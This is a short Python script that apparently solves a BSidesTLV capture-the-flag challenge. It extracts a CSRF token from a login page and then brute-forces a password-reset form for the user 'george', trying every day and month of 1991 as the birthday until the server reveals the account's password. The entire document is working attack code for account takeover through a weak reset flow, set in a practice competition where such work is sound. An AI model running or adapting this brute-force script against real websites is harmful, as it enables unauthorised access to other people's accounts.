import requests
import re
URL = "http://challenges.bsidestlv.com:8084/"
login = 'login.php'
reset = 'pwreset.php'
response = requests.get(URL+login)

regex = re.search(r'<input type="hidden" name="__CSRFToken__" value="(.*)"', response.text)
CSRF = regex.group(1).split('"')[0]
print(CSRF)


for i in range(0,32):
  for j in range(0,13):
    k = f'{i:02}/{j:02}/1991'
    data = {
        "__CSRFToken__": CSRF,
        "do": "sendmail",
        "username": "george",
        "birthday": k,
        "question_id": "2",
        "question_answer": "Friends"
    }

    response = requests.post(URL+reset, data=data)
    if "Incorrect answer!" not in response.text:
      print("FOUND")
      print("password: " + re.search(r'<p class="success">Congratulation! your password is: <b>(.*)</b></p>', response.text).group(1))
      exit(0)
